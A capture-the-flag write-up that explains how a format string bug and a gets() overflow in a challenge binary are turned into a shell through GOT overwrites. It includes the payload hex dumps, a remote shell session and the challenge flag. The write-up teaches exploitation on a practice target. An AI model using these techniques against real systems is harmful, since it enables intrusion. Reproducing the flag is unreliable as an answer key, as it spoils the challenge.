# Say as I say, not as I do - Points: 150 - (Solves: 23)

**Category**: Binary Exploitation

**Description**: We found a custom service at challenge.acictf.com:61713. Our
analysts think that the service might be vulnerable, see if you can compromise
it. Binary: [registrar](registrar), libc: [libc.so](libc.so)

**Hints**:
- Address space randomization is disabled, so ASLR-you up to the challenge?
- Historically, libc has been a good source of both ROP gadgets and utility
  functions.
- Getting remote access to the host will make obtaining the flag trivial.

## Solution

We're given a copy of a server binary and the target libc. Checksec indicates
it's a 64-bit binary with stack canaries and NX enabled. The binary has a
static base address, so we may be able to use ROP or a got overwrite without an
initial information leak if we find a memory corruption vuln.

```
$ checksec registrar
[*] '/home/user/ctf-writeups/2018-cyberstakes/say_as_i_say_not_as_i_do/registrar'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Opening the program in IDA, we see that it is incredibly straight-forward. If
no arguments are supplied, it will read up to 64 bytes into an appropriately
sized stack buffer with `read()`. It will then pass this buffer directly to
`printf()` as the first argument. This gives us a textbook format string
vulnerability, as we supply the format! The program then calls the unsafe
`gets()` function, leading to a stack based buffer overflow.

On my first pass through the binary, I saw the format string vulnerability, and
immediately decided to use it alone to gain full remote code execution.

My general methodology to solve this problem was to use the format string to
leak a libc pointer from the got in order to bypass ASLR. From there, we can
compute the offset of `system()`, and use the format string again to overwrite
a got entry with `system()`. Since the hints specify that ASLR is off, we can
leak the libc pointer in one connection, then reconnect and exploit in the
next.

A common trick I use when exploiting simple programs like this is to find a way
to "loop" the program so that we can trigger our primitive multiple times. For
this to happen, we can overwrite the `__stack_chk_fail` got entry with the
address of main in the first format string, and then cause a stack cookie
protection error by overflowing the stack-based buffer in the call to `gets()`.
On return, the program will try to call `__stack_chk_fail` since we corrupted
the cookie, but will instead restart at main.

Now that we've converted the single-shot program into a loop, we can now
trigger the format string multiple times for arbitrary read/write across all
mapped memory. For our second stage, we overwrite the got entry for `printf()`
with `system()`, and trigger our the payload by sending "/bin/sh".

We can use hellman's `libformatstr` library to quickly generate our format
string payloads. The version in the pip repository doesn't support x64, so you
will have to clone and install it directly from github.

```
cd libformatstr
sudo python2 ./setup.py install
cd -
```

A short [script](solve.py) implementing this solution yields a flag.

```
$ ./solve.py
[*] '/home/user/ctf-writeups/2018-cyberstakes/say_as_i_say_not_as_i_do/registrar'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] '/home/user/ctf-writeups/2018-cyberstakes/say_as_i_say_not_as_i_do/libc.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Leaking libc base
[+] Opening connection to challenge.acictf.com on port 61713: Done
[*] Closed connection to challenge.acictf.com port 61713
[*] libc puts: 0x7ffff7a7c690
[*] libc base  : 0x7ffff7a0d000
[*] libc system: 0x7ffff7a52390
[*] main       : 0x4009e5
[*] gets.got   : 0x602068
[*] __stack_chk_fail.got: 0x602030
[+] Opening connection to challenge.acictf.com on port 61713: Done
[*] Overwriting __stack_chk_fail with main
WARNING: Can't avoid null byte at address 0x602030
WARNING: Can't avoid null byte at address 0x602032
WARNING: Payload contains NULL bytes.
[*] 00000000  25 36 34 63  25 31 33 24  68 6e 25 32  34 36 39 63  │%64c│%13$│hn%2│469c│
    00000010  25 31 34 24  68 6e 41 41  32 20 60 00  00 00 00 00  │%14$│hnAA│2 `·│····│
    00000020  30 20 60 00  00 00 00 00                            │0 `·│····││
    00000028
[*] Overwriting printf with system
WARNING: Can't avoid null byte at address 0x602038
WARNING: Can't avoid null byte at address 0x60203a
WARNING: Payload contains NULL bytes.
[*] 00000000  25 39 31 30  34 63 25 31  34 24 68 6e  25 35 34 32  │%910│4c%1│4$hn│%542│
    00000010  39 33 63 25  31 35 24 68  6e 41 41 41  41 41 41 41  │93c%│15$h│nAAA│AAAA│
    00000020  38 20 60 00  00 00 00 00  3a 20 60 00  00 00 00 00  │8 `·│····│: `·│····│
    00000030
[*] Sending /bin/sh
[*] Switching to interactive mode
$ id
uid=1027(say-as-i-say--not-as-i-do_0) gid=1028(say-as-i-say--not-as-i-do_0) groups=1028(say-as-i-say--not-as-i-do_0)
$ ls -l
total 1864
-r--r----- 1 hacksports say-as-i-say--not-as-i-do_0      33 Nov 30 12:31 flag.txt
-rw-rw-r-- 1 hacksports hacksports                  1868984 Nov 30 12:31 libc.so
-rwxr-xr-x 1 hacksports hacksports                    13480 Nov 30 12:31 registrar
-rwxr-sr-x 1 hacksports say-as-i-say--not-as-i-do_0    8672 Nov 30 12:31 registrar_no_aslr
-rwxr-sr-x 1 hacksports say-as-i-say--not-as-i-do_0     141 Nov 30 12:31 xinet_startup.sh
$ cat flag.txt
ACI{40a499a13a193b298c7de2043d1}
```

After solving this challenge, I realized it would probably have been quicker
and easier to just use the format string vulnerability for an info leak of the
canary, followed by a traditional stack buffer overflow. In any case, the
problem was solved, and this was good practice dealing with edge cases that
made exploitation harder. For one instance of this, see the comments at the
start of the [solve script](solve.py).
